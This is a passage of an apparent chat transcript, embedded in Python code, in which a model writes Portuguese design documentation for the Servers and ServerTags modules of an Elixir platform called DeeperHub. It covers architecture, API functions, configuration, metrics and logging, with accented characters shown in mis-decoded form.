‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/ singular)
‚îÇ   ‚îú‚îÄ‚îÄ server.ex
‚îÇ   ‚îî‚îÄ‚îÄ invite.ex
‚îÇ   ‚îî‚îÄ‚îÄ reputation.ex                 # Se a reputa√ß√£o for fortemente ligada ao servidor
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ server_status_monitor_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ server_reputation_calculator_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ rate_limit_integration.ex
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex                      # Ou um Metrics.ex dedicado
```
**Subm√≥dulos de \"Servi√ßos\" da documenta√ß√£o original seriam seus pr√≥prios contextos de dom√≠nio:**
```
lib/deeper_hub/server_tags/
lib/deeper_hub/server_packages/
lib/deeper_hub/server_events/
lib/deeper_hub/server_alerts/
lib/deeper_hub/server_reviews/
lib/deeper_hub/server_update_messages/
```
Cada um com sua pr√≥pria estrutura (fachada, servi√ßo, schemas, storage/adapter, supervisor, telemetry). O `DeeperHub.Servers` ent√£o interagiria com as fachadas desses m√≥dulos.

### 3.3. Decis√µes de Design Importantes

*   **Dom√≠nio Rico vs. An√™mico:** O `ServerSchema` e o `DefaultServersService` devem conter l√≥gica de neg√≥cio relevante para um servidor.
*   **Delega√ß√£o para Subdom√≠nios:** Funcionalidades como Tags, Pacotes, Eventos, Reviews, etc., s√£o complexas o suficiente para serem seus pr√≥prios contextos/m√≥dulos de dom√≠nio, com os quais `DeeperHub.Servers` interage. Isso mant√©m o m√≥dulo `Servers` focado na entidade principal.
*   **Propriedade e Autoriza√ß√£o:** A l√≥gica de quem pode fazer o qu√™ com um servidor (propriet√°rio, administradores, jogadores) √© fundamental e deve ser integrada com `DeeperHub.Auth` e `DeeperHub.RBAC`.
*   **Caching Estrat√©gico:** Dados de servidores frequentemente visualizados (listagens, detalhes de servidores populares) devem ser cacheados. A invalida√ß√£o do cache deve ocorrer quando os dados do servidor ou de seus sub-recursos (reviews, tags) mudam.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio Cria um Novo Servidor:**
    *   Usu√°rio autenticado (propriet√°rio) preenche um formul√°rio.
    *   A API chama `DeeperHub.Servers.create_server(user_id, server_attrs)`.
    *   O servi√ßo valida os dados, verifica permiss√µes, e persiste o novo servidor.
    *   Um evento `server_created` √© publicado.
*   **Jogador Procura Servidores de \"RPG PvP\":**
    *   A API recebe uma requisi√ß√£o para `GET /api/v1/servers?tags=rpg,pvp`.
    *   Chama `DeeperHub.Servers.list_servers(%{tags: [\"rpg\", \"pvp\"], include_stats: true})`.
    *   O servi√ßo consulta servidores, possivelmente buscando tags no m√≥dulo `ServerTags`, e retorna a lista.
*   **Jogador Avalia um Servidor:**
    *   A API chama `DeeperHub.ServerReviews.create_review(user_id, server_id, review_attrs)`.
    *   O `ServerReviews` valida e salva a review.
    *   Pode disparar um evento que o `DeeperHub.Servers` escuta para recalcular a m√©dia de avalia√ß√£o do servidor e invalidar o cache.
*   **Sistema Monitora Status de um Servidor:**
    *   `ServerStatusMonitorWorker` periodicamente tenta se conectar ao `server.address` e `server.port`.
    *   Atualiza o `server.status` e `server.last_seen_online_at` via `DeeperHub.Servers.update_server_status(server_id, new_status_info)`.

## üåä 5. Fluxos Importantes

### Fluxo de Cria√ß√£o de Servidor

1.  **Requisi√ß√£o API/UI:** Usu√°rio submete dados para criar um servidor.
2.  **Controller API:** Valida a autentica√ß√£o do usu√°rio. Chama `DeeperHub.Servers.create_server(current_user.id, params)`.
3.  **`DeeperHub.Servers` (Fachada):** Delega para `DefaultServersService.create_server/2`.
4.  **`DefaultServersService.create_server/2`:**
    *   Verifica se o usu√°rio tem permiss√£o para criar servidores (ex: `DeeperHub.RBAC.has_permission?(user_id, :server, :create)`).
    *   Cria um changeset para `DeeperHub.Servers.Schema.Server` com os `params` e `owner_id: current_user.id`.
    *   Se o changeset for v√°lido:
        *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
        *   Se a inser√ß√£o for bem-sucedida:
            *   Publica um evento `server_created` via `Core.EventBus` com os dados do novo servidor.
            *   Registra no `DeeperHub.Audit`.
            *   Retorna `{:ok, server_struct}`.
        *   Se a inser√ß√£o falhar, retorna `{:error, db_error_reason}`.
    *   Se o changeset for inv√°lido, retorna `{:error, changeset}`.

### Fluxo de Listagem de Servidores com Filtro por Tag

1.  **Requisi√ß√£o API/UI:** `GET /servers?tags=pvp,economy`
2.  **Controller API:** Chama `DeeperHub.Servers.list_servers(%{tags: [\"pvp\", \"economy\"], page: 1, per_page: 20})`.
3.  **`DeeperHub.Servers` (Fachada):** Delega para `DefaultServersService.list_servers/1`.
4.  **`DefaultServersService.list_servers/1`:**
    *   **Cache Check (Opcional):** Tenta buscar do `Core.Cache` usando uma chave baseada nos filtros. Se hit, retorna.
    *   **Consulta ao `ServerTags`:** Chama `DeeperHub.ServerTags.list_servers_by_tags([\"pvp\", \"economy\"])` para obter uma lista de `server_ids`.
    *   **Constru√ß√£o da Query Ecto:**
        ```elixir
        query = from(s in Server, where: s.id in ^server_ids_from_tags)
        # Aplicar outros filtros (status, nome, etc.)
        # Aplicar ordena√ß√£o e pagina√ß√£o
        ```
    *   Executa a query via `Core.Repo.all(query)`.
    *   (Opcional) Para cada servidor, busca informa√ß√µes adicionais como avalia√ß√£o m√©dia (`ServerReviews.get_average_rating(server.id)`).
    *   **Cache Put (Opcional):** Armazena o resultado no `Core.Cache`.
    *   Retorna `{:ok, %{servers: results, pagination_details: ...}}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Servers`)

*(Baseado na documenta√ß√£o original e consolidando com as responsabilidades dos subm√≥dulos que seriam delegados)*

### 6.1. `DeeperHub.Servers.create_server(owner_id :: String.t(), attrs :: map()) :: {:ok, Server.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Cria um novo servidor.
*   **`attrs`:** Mapa com dados do servidor (ex: `:name`, `:description`, `:address`, `:port`, `:game_type`, `:banner_url`, etc.).

### 6.2. `DeeperHub.Servers.get_server(server_id :: String.t(), opts :: keyword()) :: {:ok, Server.t() | nil} | {:error, term()}`

*   **Descri√ß√£o:** Obt√©m um servidor pelo seu ID.
*   **`opts`:**
    *   `:preload` (list): Associa√ß√µes Ecto a serem pr√©-carregadas (ex: `[:tags, :reviews, :active_events]`).
    *   `:include_stats` (boolean): Se deve incluir estat√≠sticas agregadas como avalia√ß√£o m√©dia, contagem de jogadores (pode envolver chamadas a outros servi√ßos).
*   **Retorno:** `{:ok, server}` ou `{:ok, nil}` se n√£o encontrado (ou `{:error, :not_found}`).

### 6.3. `DeeperHub.Servers.list_servers(filters :: map(), opts :: keyword()) :: {:ok, list(Server.t()), Pagination.t()} | {:error, term()}`

*   **Descri√ß√£o:** Lista servidores com base em filtros, ordena√ß√£o e pagina√ß√£o.
*   **`filters`:** Mapa com filtros (ex: `%{name_contains: \"craft\", tags: [\"survival\"], min_rating: 4.0, status: :online, owner_id: \"user123\"}`).
*   **`opts`:** `:sort_by`, `:sort_order`, `:page`, `:per_page`, `:preload`, `:include_stats`.

### 6.4. `DeeperHub.Servers.update_server(server_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Server.t()} | {:error, Ecto.Changeset.t() | :unauthorized | term()}`

*   **Descri√ß√£o:** Atualiza um servidor existente. Requer que `current_user_id` seja o propriet√°rio ou tenha permiss√£o de admin.

### 6.5. `DeeperHub.Servers.delete_server(server_id :: String.t(), current_user_id :: String.t()) :: {:ok, Server.t()} | {:error, :unauthorized | :not_found | term()}`

*   **Descri√ß√£o:** Exclui um servidor.

### 6.6. Fun√ß√µes Delegadas para Subm√≥dulos (Exemplos):

*   `DeeperHub.Servers.add_tag_to_server(server_id, tag_name, current_user_id)` -> Delega para `DeeperHub.ServerTags`.
*   `DeeperHub.Servers.list_server_reviews(server_id, filters, opts)` -> Delega para `DeeperHub.ServerReviews`.
*   `DeeperHub.Servers.create_server_package(server_id, package_attrs, current_user_id)` -> Delega para `DeeperHub.ServerPackages`.
*   ... e assim por diante para `ServerEvents`, `ServerAlerts`, `ServerUpdateMessages`, `ServerInvites`.

### 6.7. `DeeperHub.Servers.update_server_status(server_id :: String.t(), status_info :: map()) :: {:ok, Server.t()} | {:error, term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Atualiza o status de um servidor (online, offline, player_count). Usado por um worker de monitoramento.
*   **`status_info`:** `%{status: :online | :offline, player_count: integer(), max_players: integer(), version: String.t()}`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:servers, :max_servers_per_user]`** (Integer): Limite de servidores que um usu√°rio pode criar. (Padr√£o: `5`)
*   **`[:servers, :default_list_page_size]`** (Integer): Tamanho padr√£o da p√°gina para listagens. (Padr√£o: `20`)
*   **`[:servers, :cache, :server_details_ttl_seconds]`** (Integer): TTL para cache de detalhes de servidor. (Padr√£o: `300`)
*   **`[:servers, :cache, :server_list_ttl_seconds]`** (Integer): TTL para cache de listagens de servidor. (Padr√£o: `60`)
*   **`[:servers, :status_monitor, :enabled]`** (Boolean): Habilita o worker de monitoramento de status. (Padr√£o: `true`)
*   **`[:servers, :status_monitor, :check_interval_seconds]`** (Integer): Intervalo para verificar status dos servidores. (Padr√£o: `300`)
*   **`[:servers, :reputation, :recalculation_interval_hours]`** (Integer): Intervalo para recalcular reputa√ß√£o.
*   *(Configura√ß√µes espec√≠ficas para tags, reviews, pacotes, etc., residiriam em seus respectivos m√≥dulos)*

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.Repo`: Para persist√™ncia.
*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth` e `DeeperHub.RBAC`: Para autoriza√ß√£o de propriet√°rios e administradores.
*   `DeeperHub.Accounts`: Para associar servidores a propriet√°rios.
*   **Subm√≥dulos de Servi√ßo:** `DeeperHub.ServerTags`, `ServerPackages`, `ServerEvents`, `ServerAlerts`, `ServerReviews`, `ServerUpdateMessages`.
*   `DeeperHub.Servers.RateLimitIntegration`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Bibliotecas para query de status de servidores de jogos espec√≠ficos (ex: Minecraft RCON, Source Query), se o `ServerStatusMonitorWorker` for implementado.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **APIs Web/Mobile:** Controllers da API chamar√£o as fun√ß√µes da fachada `DeeperHub.Servers` para realizar opera√ß√µes.
*   **Painel de Propriet√°rio do Servidor:** Uma UI web para propriet√°rios gerenciarem seus servidores usaria esses endpoints.
*   **Sistema de Busca:** O `DeeperHub.Services.Search` usaria `DeeperHub.Servers.list_servers/2` com v√°rios filtros.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar todas as opera√ß√µes CRUD para servidores.
*   Testar a l√≥gica de listagem com diferentes filtros e ordena√ß√µes.
*   Testar as intera√ß√µes com os subm√≥dulos (tags, reviews, etc.) usando mocks ou testes de integra√ß√£o.
*   Testar a l√≥gica de autoriza√ß√£o (propriet√°rio vs. outros usu√°rios).
*   Testar o funcionamento dos workers (monitor de status, c√°lculo de reputa√ß√£o).
*   Localiza√ß√£o: `test/deeper_hub/servers/`.

### 10.2. M√©tricas

*   `deeper_hub.servers.created.count`
*   `deeper_hub.servers.updated.count`
*   `deeper_hub.servers.deleted.count`
*   `deeper_hub.servers.listed.count` (tags: `filter_count`)
*   `deeper_hub.servers.viewed.count` (tags: `server_id`)
*   `deeper_hub.servers.active.gauge` (Gauge)
*   `deeper_hub.servers.status_monitor.checked.count` (tags: `status_returned`)
*   *(M√©tricas dos subm√≥dulos seriam registradas por eles pr√≥prios)*

### 10.3. Logs

*   **N√≠vel INFO:** Cria√ß√£o, atualiza√ß√£o, exclus√£o de servidores. Mudan√ßa de status de servidor.
*   **N√≠vel WARNING:** Falha ao obter status de um servidor pelo monitor. Tentativa n√£o autorizada de modificar um servidor.
*   **N√≠vel ERROR:** Falha cr√≠tica ao interagir com o banco de dados.

### 10.4. Telemetria

*   `[:deeper_hub, :servers, :server, :created | :updated | :deleted]`
    *   Metadados: `%{server_id: id, owner_id: id, changes: map_if_updated}`
*   `[:deeper_hub, :servers, :server, :status_changed]`
    *   Metadados: `%{server_id: id, old_status: atom, new_status: atom}`
*   `[:deeper_hub, :servers, :list_query, :executed]`
    *   Metadados: `%{filters: map, sort: map, pagination: map, result_count: count}`
*   *(Eventos de telemetria dos subm√≥dulos seriam emitidos por eles)*

## ‚ùå 11. Tratamento de Erros

*   Opera√ß√µes CRUD retornam `{:ok, result}` ou `{:error, changeset | reason}`.
*   Falhas de autoriza√ß√£o retornam `{:error, :unauthorized}`.
*   Recursos n√£o encontrados retornam `{:error, :not_found}` ou `nil` (para fun√ß√µes `get_`).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Autoriza√ß√£o:** A verifica√ß√£o rigorosa de propriedade e permiss√µes √© crucial para todas as opera√ß√µes de escrita.
*   **Valida√ß√£o de Entrada:** Todos os dados fornecidos pelo usu√°rio (nomes de servidor, descri√ß√µes, endere√ßos IP/portas) devem ser validados para prevenir XSS (se exibidos) e outros ataques. Endere√ßos IP/hostnames devem ser validados para evitar SSRF se o sistema tentar se conectar a eles.
*   **Rate Limiting:** Proteger contra a cria√ß√£o excessiva de servidores ou atualiza√ß√µes frequentes.
*   **Modera√ß√£o de Conte√∫do:** Conte√∫do gerado pelo usu√°rio (nome do servidor, descri√ß√£o, tags, reviews) precisa de modera√ß√£o.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de neg√≥cio espec√≠fica do servidor no `DefaultServersService`.
*   Para funcionalidades relacionadas (tags, reviews, etc.), crie ou use os m√≥dulos de servi√ßo dedicados e interaja com suas fachadas.
*   Adicione testes abrangentes para novas funcionalidades e filtros de listagem.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"destaque\" ou \"promo√ß√£o\" de servidores.
*   [ ] Adicionar mais op√ß√µes de filtros avan√ßados na listagem (ex: por tipo de jogo espec√≠fico, mods, vers√£o).
*   [ ] Integrar com um sistema de vota√ß√£o para servidores.
*   [ ] Permitir que propriet√°rios customizem a p√°gina de seus servidores com mais detalhes.
*   [ ] Desenvolver um sistema de \"reivindica√ß√£o\" para servidores existentes que foram adicionados por outros usu√°rios.
*   [ ] Melhorar o `ServerStatusMonitorWorker` para suportar diferentes protocolos de query de jogos.
*   [ ] Implementar um sistema de ranking de servidores mais sofisticado do que apenas avalia√ß√£o m√©dia.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo `Servers` √© um bom exemplo de um contexto de dom√≠nio que interage com muitos outros.

O que acha de detalharmos agora um desses subm√≥dulos que `Servers` utilizaria, como `DeeperHub.ServerTags` ou `DeeperHub.ServerReviews`? Ou prefere outro m√≥dulo Core ou de Seguran√ßa?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar um dos subm√≥dulos que o `DeeperHub.Servers` utilizaria: `DeeperHub.ServerTags`. Este m√≥dulo, embora mais simples que `Servers`, √© importante para a organiza√ß√£o e descoberta de servidores.

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerTags`. Estamos elevando-o a um contexto de dom√≠nio pr√≥prio, ou um subm√≥dulo bem definido dentro de `DeeperHub.Servers` se a complexidade n√£o justificar um contexto totalmente separado. Para este README, vou trat√°-lo como `DeeperHub.ServerTags` para clareza, mas a estrutura de pastas pode refleti-lo dentro de `servers/` se preferir.)*

---

# M√≥dulo: `DeeperHub.ServerTags` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerTags`

O m√≥dulo `DeeperHub.ServerTags` √© respons√°vel por gerenciar as **tags (etiquetas)** associadas aos servidores na plataforma DeeperHub. As tags s√£o palavras-chave ou frases curtas que descrevem caracter√≠sticas, modos de jogo, comunidades ou outros aspectos relevantes de um servidor, ajudando os usu√°rios a encontrar servidores de seu interesse e permitindo que os propriet√°rios categorizem seus servidores.

Este m√≥dulo lida com a cria√ß√£o de novas tags, a associa√ß√£o de tags a servidores, a remo√ß√£o dessas associa√ß√µes e a consulta de servidores por tags ou tags por servidor. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Cria√ß√£o e Gerenciamento de Tags (`create_tag/1`, `get_tag_by_name/1`, `update_tag/2`, `delete_tag/1`):**
    *   Permitir a cria√ß√£o de novas tags (potencialmente com modera√ß√£o ou sugest√£o).
    *   Evitar a duplica√ß√£o de tags (normalizando a entrada, ex: lowercase, sem espa√ßos extras).
    *   Permitir a atualiza√ß√£o (ex: renomear, adicionar descri√ß√£o) ou exclus√£o de tags (com cuidado para as associa√ß√µes existentes).
*   **Associa√ß√£o de Tags a Servidores (`add_tag_to_server/3`, `remove_tag_from_server/3`):**
    *   Permitir que propriet√°rios de servidores (ou administradores) associem tags existentes a um servidor.
    *   Permitir a remo√ß√£o de tags de um servidor.
    *   Limitar o n√∫mero de tags por servidor (configur√°vel).
*   **Consulta de Tags e Servidores:**
    *   Listar todas as tags associadas a um servidor espec√≠fico (`list_tags_by_server/1`).
    *   Listar todos os servidores associados a uma ou mais tags (`list_servers_by_tags/2`).
    *   Listar todas as tags dispon√≠veis no sistema, possivelmente com contagem de uso (`list_tags/1`).
    *   Listar tags populares ou em tend√™ncia (`list_popular_tags/1`).
*   **Normaliza√ß√£o e Valida√ß√£o de Tags:**
    *   Validar o formato das tags (ex: comprimento, caracteres permitidos).
    *   Normalizar tags para consist√™ncia (ex: converter para min√∫sculas, remover espa√ßos extras, tratar sin√¥nimos se avan√ßado).
*   **Sugest√£o de Tags (Opcional):**
    *   Sugerir tags existentes enquanto um usu√°rio digita.
*   **Observabilidade:**
    *   Registrar logs e m√©tricas para opera√ß√µes com tags.
    *   Publicar eventos de dom√≠nio (tag criada, tag associada a servidor) no `Core.EventBus`.
*   **Caching:**
    *   Cachear listas de tags populares ou tags por servidor para melhorar o desempenho.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerTags` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a tags de servidor.
    *   Delega para o `ServerTagsService`.
2.  **`DeeperHub.ServerTags.Services.ServerTagsService` (ou `DefaultServerTagsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para tags.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `TagSchema` e `ServerTagLinkSchema` (tabela de jun√ß√£o).
        *   `DeeperHub.Core.Cache`: Para cachear tags populares e tags por servidor.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes (limite de tags, caracteres permitidos).
3.  **Schemas Ecto:**
    *   **`DeeperHub.ServerTags.Schema.Tag`:** Representa uma tag √∫nica no sistema (ex: `id`, `name`, `description`, `usage_count`).
    *   **`DeeperHub.ServerTags.Schema.ServerTagLink` (ou `ServerTagAssociation`):** Tabela de jun√ß√£o many-to-many entre `Servers` e `Tags` (ex: `server_id`, `tag_id`, `added_by_user_id`, `added_at`).
4.  **`DeeperHub.ServerTags.Storage` (ou l√≥gica dentro do `ServerTagsService`):**
    *   Encapsula as consultas Ecto.
5.  **`DeeperHub.ServerTags.CachedAdapter` (Opcional, da documenta√ß√£o original):**
    *   Se for decidido ter uma camada de cache expl√≠cita para este m√≥dulo, al√©m do `Core.Cache`.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_tags/
‚îú‚îÄ‚îÄ server_tags.ex                    # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_tags_service.ex        # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ tag.ex
‚îÇ   ‚îî‚îÄ‚îÄ server_tag_link.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers, ex: para calcular popularidade)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Tabela de Tags √önicas:** Manter uma tabela separada para tags (`TagSchema`) para evitar redund√¢ncia de strings de tag e permitir o gerenciamento centralizado de tags (descri√ß√µes, sin√¥nimos, etc.).
*   **Normaliza√ß√£o na Cria√ß√£o/Associa√ß√£o:** Tags devem ser normalizadas (ex: min√∫sculas, sem espa√ßos extras nas pontas) antes de serem salvas ou associadas para garantir consist√™ncia.
*   **Contagem de Uso:** O campo `usage_count` na `TagSchema` pode ser atualizado (atomicamente ou por um worker) sempre que uma tag √© associada/desassociada de um servidor, facilitando a listagem de tags populares.
*   **Autoriza√ß√£o:** A adi√ß√£o/remo√ß√£o de tags a um servidor deve ser restrita ao propriet√°rio do servidor ou administradores.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio Adiciona Tags a um Servidor:**
    *   Na p√°gina de edi√ß√£o do servidor, o propriet√°rio digita \"PvP\", \"Survival\", \"Economy\".
    *   A UI chama `DeeperHub.ServerTags.add_tags_to_server(server_id, [\"PvP\", \"Survival\", \"Economy\"], current_user_id)`.
    *   O `ServerTagsService` normaliza as tags, encontra/cria as tags na tabela `Tag`, e cria as associa√ß√µes na `ServerTagLink`. O `usage_count` das tags √© incrementado.
*   **Jogador Filtra Servidores por Tag:**
    *   Jogador seleciona a tag \"RPG\" na interface de busca.
    *   A UI/API chama `DeeperHub.Servers.list_servers(%{tags: [\"rpg\"]})`.
    *   O `DeeperHub.Servers` internamente chama `DeeperHub.ServerTags.list_servers_by_tags([\"rpg\"])` para obter os `server_ids` relevantes.
*   **Administrador Modera uma Tag:**
    *   Um admin edita uma tag \"mmorpg\" para adicionar uma descri√ß√£o ou corrigir um erro de digita√ß√£o.
    *   Chama `DeeperHub.ServerTags.update_tag(tag_id, %{description: \"Massively Multiplayer Online Role-Playing Game\"})`.

## üåä 5. Fluxos Importantes

### Fluxo de Adicionar uma Tag a um Servidor

1.  **Solicita√ß√£o:** `DeeperHub.ServerTags.add_tag_to_server(server_id, \"new_tag_name\", user_id)`.
2.  **`ServerTagsService.add_tag_to_server/3`:**
    *   Verifica se `user_id` tem permiss√£o para modificar tags do `server_id` (via `DeeperHub.Auth/RBAC` e consulta ao propriet√°rio do servidor).
    *   Normaliza `new_tag_name` (ex: para min√∫sculas, trim).
    *   **Encontra ou Cria a Tag:**
        *   Chama `Storage.get_tag_by_name(normalized_tag_name)`.
        *   Se n√£o encontrada, chama `Storage.create_tag(%{name: normalized_tag_name})`.
        *   Se a cria√ß√£o falhar, retorna erro.
    *   Obt√©m o `tag_id`.
    *   Verifica se a associa√ß√£o `(server_id, tag_id)` j√° existe na `ServerTagLinkSchema`.
        *   Se sim, n√£o faz nada ou atualiza `added_at` (dependendo da l√≥gica).
        *   Se n√£o:
            *   Cria uma nova entrada em `ServerTagLinkSchema` com `server_id`, `tag_id`, `added_by_user_id`.
            *   Incrementa `usage_count` na `TagSchema` para o `tag_id` (atomicamente).
            *   Publica evento `server_tag_added` no `Core.EventBus`.
            *   Invalida caches relevantes (ex: tags do servidor, listagem de servidores por tag).
    *   Retorna `{:ok, tag_struct}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerTags`)

### 6.1. `DeeperHub.ServerTags.add_tags_to_server(server_id :: String.t(), tag_names :: list(String.t()), current_user_id :: String.t()) :: {:ok, list(Tag.t())} | {:error, term()}`

*   **Descri√ß√£o:** Associa uma lista de tags a um servidor. Cria as tags se n√£o existirem. Verifica permiss√£o.
*   **Retorno:** Lista das structs `Tag` associadas, ou erro.

### 6.2. `DeeperHub.ServerTags.remove_tag_from_server(server_id :: String.t(), tag_name :: String.t(), current_user_id :: String.t()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Remove a associa√ß√£o de uma tag de um servidor. Verifica permiss√£o. Decrementa `usage_count`.

### 6.3. `DeeperHub.ServerTags.list_tags_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Tag.t())}`

*   **Descri√ß√£o:** Lista todas as tags associadas a um servidor.
*   **`opts`:** `:limit`, `:sort_by` (ex: `:name`, `:usage_count`).

### 6.4. `DeeperHub.ServerTags.list_servers_by_tags(tag_names :: list(String.t()), opts :: keyword()) :: {:ok, list(Server.t()), Pagination.t()}`

*   **Descri√ß√£o:** Lista servidores que possuem *todas* as tags especificadas (AND) ou *qualquer uma* (OR, configur√°vel).
*   **`opts`:** `:match_type` (`:all` | `:any`), `:page`, `:per_page`, `:preload_servers_with`.

### 6.5. `DeeperHub.ServerTags.list_tags(opts :: keyword()) :: {:ok, list(Tag.t()), Pagination.t()}`

*   **Descri√ß√£o:** Lista todas as tags √∫nicas no sistema.
*   **`opts`:** `:sort_by` (`:name`, `:usage_count`), `:page`, `:per_page`, `:search_term`.

### 6.6. `DeeperHub.ServerTags.list_popular_tags(limit :: integer(), opts :: keyword()) :: {:ok, list(Tag.t())}`

*   **Descri√ß√£o:** Lista as tags mais usadas.
*   **`opts`:** `:min_usage_count`.

### 6.7. `DeeperHub.ServerTags.create_tag(attrs :: map(), current_user_id :: String.t()) :: {:ok, Tag.t()} | {:error, Ecto.Changeset.t()}` (Admin)

*   **Descri√ß√£o:** Cria uma nova tag globalmente (requer permiss√£o de admin).
*   **`attrs`:** `%{name: String.t(), description: String.t() | nil}`.

### 6.8. `DeeperHub.ServerTags.suggest_tags(partial_name :: String.t(), limit :: integer()) :: {:ok, list(String.t())}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Sugere nomes de tags existentes com base em uma entrada parcial.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_tags, :max_tags_per_server]`** (Integer): N√∫mero m√°ximo de tags que um servidor pode ter. (Padr√£o: `10`)
*   **`[:server_tags, :max_tag_length]`** (Integer): Comprimento m√°ximo de uma string de tag. (Padr√£o: `25`)
*   **`[:server_tags, :min_tag_length]`** (Integer): Comprimento m√≠nimo. (Padr√£o: `2`)
*   **`[:server_tags, :allowed_chars_regex]`** (String): Regex para caracteres permitidos em tags (ex: `^[a-zA-Z0-9\\-\\#\\+]+$`).
*   **`[:server_tags, :auto_lowercase_tags]`** (Boolean): Se as tags devem ser convertidas automaticamente para min√∫sculas. (Padr√£o: `true`)
*   **`[:server_tags, :cache, :popular_tags_ttl_seconds]`** (Integer): TTL para cache de tags populares. (Padr√£o: `3600`)
*   **`[:server_tags, :cache, :tags_by_server_ttl_seconds]`** (Integer): TTL para cache de tags por servidor. (Padr√£o: `600`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.Repo`: Para persist√™ncia.
*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth` e `DeeperHub.RBAC`: Para verificar permiss√µes de propriet√°rios/admins para modificar tags de um servidor.
*   `DeeperHub.Servers`: Para validar `server_id` e, potencialmente, para o `ServerTags` ser um subm√≥dulo dele.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **M√≥dulo `DeeperHub.Servers`:**
    *   Ao exibir detalhes de um servidor, chama `ServerTags.list_tags_by_server/1`.
    *   Ao listar servidores com filtro de tag, chama `ServerTags.list_servers_by_tags/2`.
*   **Interface de Gerenciamento de Servidor (UI/API):**
    *   Permite que propriet√°rios chamem `ServerTags.add_tags_to_server/3` e `ServerTags.remove_tag_from_server/3`.
*   **Sistema de Busca:**
    *   Pode usar `ServerTags.list_servers_by_tags/2` como parte de uma busca facetada.
    *   Pode usar `ServerTags.suggest_tags/2` para autocomplete no campo de busca de tags.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a cria√ß√£o de tags (com normaliza√ß√£o e preven√ß√£o de duplicatas).
*   Testar a associa√ß√£o e desassocia√ß√£o de tags a servidores, incluindo verifica√ß√£o de permiss√£o.
*   Testar a atualiza√ß√£o do `usage_count`.
*   Testar as fun√ß√µes de listagem (`list_tags_by_server`, `list_servers_by_tags`, `list_popular_tags`) com diferentes cen√°rios e filtros.
*   Testar a valida√ß√£o de formato e limites de tags.
*   Localiza√ß√£o: `test/deeper_hub/server_tags/`.

### 10.2. M√©tricas

*   `deeper_hub.server_tags.tag.created.count`
*   `deeper_hub.server_tags.tag.associated_to_server.count` (tags: `server_id`, `tag_name`)
*   `deeper_hub.server_tags.tag.removed_from_server.count` (tags: `server_id`, `tag_name`)
*   `deeper_hub.server_tags.usage_count.updates.count` (tags: `tag_name`)
*   `deeper_hub.server_tags.cache.hit.count` (tags: `cache_type` (`popular`, `by_server`))
*   `deeper_hub.server_tags.cache.miss.count` (tags: `cache_type`)

### 10.3. Logs

*   **N√≠vel INFO:** Nova tag criada, tag associada/removida de servidor.
*   **N√≠vel WARNING:** Tentativa de adicionar tag inv√°lida ou exceder limite de tags por servidor. Tentativa n√£o autorizada de modificar tags.

### 10.4. Telemetria

*   `[:deeper_hub, :server_tags, :tag, :created | :updated | :deleted]`
